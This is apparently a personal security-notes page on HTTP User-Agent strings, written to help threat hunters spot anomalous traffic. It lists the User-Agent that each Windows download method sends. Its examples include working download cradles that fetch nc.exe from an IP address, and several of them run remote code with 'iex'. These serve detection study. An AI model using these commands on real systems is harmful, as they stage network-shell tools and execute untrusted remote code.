---
id: General
aliases: []
tags:
  - Webapp/General/HTTP/Header/Request/User-Agent
---

# User Agent

**User Agent String** (*[User-Agent header](https://en.wikipedia.org/wiki/User-Agent_header)*)
is an HTTP header intended to [identify the user agent](https://useragentstring.com/)
responsible for making a given HTTP request

Organizations can implement measures to identify suspicious
user agent strings by first building a list user agent strings
used by known legitimate services
(*e.g., default OS processes, update services, antivirus update*)

These can be fed into a SIEM tool used for threat hunting
to filter out legitimate traffic and focus on anomalies
that may indicate suspicious behavior

___

[Invoke-WebRequest](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.5)

<!-- Example {{{-->
> [!example]-
>
> Client
>
> ```sh
> Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe" 
> ```
> ```sh
> Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
> ```
>
> Server
>
> ```sh
> GET /nc.exe HTTP/1.1
> User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
> ```
>
<!-- }}} -->

[WinHttpRequest](https://learn.microsoft.com/en-us/windows/win32/winhttp/winhttprequest)

<!-- Example {{{-->
> [!example]-
>
> Client
>
> ```sh
> $h=new-object -com WinHttp.WinHttpRequest.5.1;
> ```
> ```sh
> $h.open('GET','http://10.10.10.32/nc.exe',$false);
> ```
> ```sh
> $h.send();
> ```
> ```sh
> iex $h.ResponseText
> ```
>
> Server
>
> ```sh
> GET /nc.exe HTTP/1.1
> Connection: Keep-Alive
> Accept: */*
> User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
> ```
>
<!-- }}} -->

[Msxml2](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/ms753804(v=vs.85))

<!-- Example {{{-->
> [!example]-
>
> Client
>
> ```sh
 $h=New-Object -ComObject Msxml2.XMLHTTP;
> ```
> ```sh
> $h.open('GET','http://10.10.10.32/nc.exe',$false);
> ```
> ```sh
> $h.send();
> ```
> ```sh
> iex $h.responseText
> ```
>
> Server
>
> ```sh
> GET /nc.exe HTTP/1.1
> Accept: */*
> Accept-Language: en-us
> UA-CPU: AMD64
> Accept-Encoding: gzip, deflate
> User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
> ```
>
<!-- }}} -->

[certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)

<!-- Example {{{-->
> [!example]-
>
> Client
>
> ```sh
> certutil -urlcache -split -f http://10.10.10.32/nc.exe 
> ```
> ```sh
> certutil -verifyctl -split -f http://10.10.10.32/nc.exe
> ```
>
> Server
>
> ```sh
> GET /nc.exe HTTP/1.1
> Cache-Control: no-cache
> Connection: Keep-Alive
> Pragma: no-cache
> Accept: */*
> User-Agent: Microsoft-CryptoAPI/10.0
> ```
>
<!-- }}} -->

[BITS](https://learn.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal)

<!-- Example {{{-->
> [!example]-
>
> Client
>
> ```sh
> Import-Module bitstransfer;
> ```
> ```sh
> Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
> ```
> ```sh
> $r=gc $env:temp\t;
> ```
> ```sh
> rm $env:temp\t;
> ```
> ```sh
> iex $r
> ```
>
> Server
>
> ```sh
> HEAD /nc.exe HTTP/1.1
> Connection: Keep-Alive
> Accept: */*
> Accept-Encoding: identity
> User-Agent: Microsoft BITS/7.8
> ```
>
<!-- }}} -->

